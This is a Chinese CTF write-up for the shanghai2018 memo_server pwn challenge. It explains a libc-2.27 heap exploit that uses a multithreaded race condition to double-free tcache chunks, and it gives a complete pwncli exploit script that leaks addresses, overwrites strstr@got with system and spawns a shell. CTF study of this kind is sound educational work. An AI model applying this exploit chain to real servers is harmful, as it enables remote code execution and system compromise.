# shanghai2018_memo_server



### 总结

多线程条件竞争，经调试分析与阅读源码，总结在多线程下释放`tcache`管理大小范围内的堆块的时候，流程大概如下：

- 线程申请`tcache_perthread_struct`结构体，这里会使用`mmap`申请
- 将堆块释放到线程对应的`tcache bins`中
- 线程结束时调用`tcache_shutdown`，将当前线程`tcache bins`所管理的`chunk`都使用`__libc_free`释放掉，这时的`tcache`变量为`NULL`，所以肯定不会进`tcache bins`，而会进入到`fastbins/unsorted bins`。

<!-- more -->

### checksec

![image-20220404225125744](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404225125744.png)

远程为`libc-2.27.so`，可以`double free`的版本。

### 漏洞点

其实这个程序很多地方都有栈溢出，但是由于使用的都是`sscanf/strlen/sprintf`等字符串类型的函数，会被`\x00`截断，所以不太好绕过`canary`，否则直接利用栈溢出就能解题。首先泄露地址可以任选一个有栈溢出的函数，然后泄露栈上残留的地址即可，这里我选用的是`echo`函数：

![image-20220404225529723](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404225529723.png)

还有一个主要利用的点，是多线程下全局变量的条件竞争：

![image-20220404225634367](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404225634367.png)

这里故意设置了`sleep(1)`就是为竞争创造条件。

### 利用思路

- 首先利用`echo`泄露出`libc`地址

- 利用条件竞争漏洞，首先泄露出堆地址，做法为：调用两次`add`，然后调用`1`次`count`，等待`1`秒，这个时候该线程已经分配的`2`个属于`memo`的`chunk`都释放掉了，此时主线程调用`GET /list`即可泄露堆地址仍
- 然后利用条件竞争漏洞，让两个线程去释放同一个`chunk`，构造出`A->B->A`的`fastbin`链
- 分配`A`，此时由于`tcache stash unlink`，就会把剩下的`B/A`都会放到`tcache bins`中去，这里可以使用`url_encode`编码，使得`memo`的长度满足要求
- 分配到`strstr@got`，修改为`system@plt`
- 输入`/bin/sh;`获取`shell`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

def get_list(keep_alive=True):
    payload = "GET /list deadbeef \n"
    if keep_alive:
        payload += "Connection: keep-alive\r\n\r\n"
    s(payload)
    m = r()
    return m


def post_add(memo, count=1, keep_alive=True):
    assert len(memo) <= 80, "memo wrong!"
    if isinstance(memo, str):
        memo = memo.encode()
    payload = b"POST /add deadbeef \n"
    if keep_alive:
        payload += b"Connection: keep-alive\r\n\r\n"
    payload += b"memo=" + memo + b"&count="+ str(count).encode()
    s(payload)
    m = r()
    return m

def post_count(keep_alive=True):
    payload = "POST /count deadbeef \n"
    if keep_alive:
        payload += "Connection: keep-alive\r\n\r\n"
    s(payload)
    m = r()
    return m

def post_echo(content, keep_alive=True):
    payload = "POST /echo deadbeef \n"
    if keep_alive:
        payload += "Connection: keep-alive\r\n\r\n"
    payload += f"content={content}"
    s(payload)
    m = r()
    return m


def url_encode(addr, length):
    addr = hex(addr)[2:].zfill(16)
    res = ""
    for i in range(0, 16, 2):
        res = "%"+addr[i:i+2] + res
    return res.ljust(length, "X")

# leak libc addr
m = post_echo("a"*0xa7+"#")
i = m.find(b"#")

assert i >= 0, "index error!"
libc_base = u64_ex(m[i+1:i+7]) - 0x10bf0
log_address("libc_base", libc_base)

assert libc_base & 0xfff == 0, "libc error"

post_add("a"*0x30, 1)
post_add("b"*0x30, 1)
post_count()
sleep(1)
m = get_list()
heap_base = u32_ex(m[0xc5:0xc5+4]) - 0x280
log_heap_base_addr(heap_base)
sleep(3)

post_add("a"*0x30, 1) # 0
post_add("b"*0x30, 1) # 1
post_add("c"*0x30, 1) # 2
post_add("c"*0x40, 3) # 3
post_count()
sleep(2)
post_add(p32(heap_base + 0x280), 1)
post_count()

sleep(6)
post_add(url_encode(elf.got.strstr, 0x30), 1) # 0

post_add("a"*0x30, 1)
post_add("b"*0x30, 1) 
post_add(url_encode(libc.sym.system + libc_base, 0x30), 1)

sleep(2)
sl("/bin/sh;")

ia()
```

![image-20220404225447815](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220404225447815.png)

多试几次就可以拿到`shell`了。

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-04-04-shanghai2018-memo-server/  

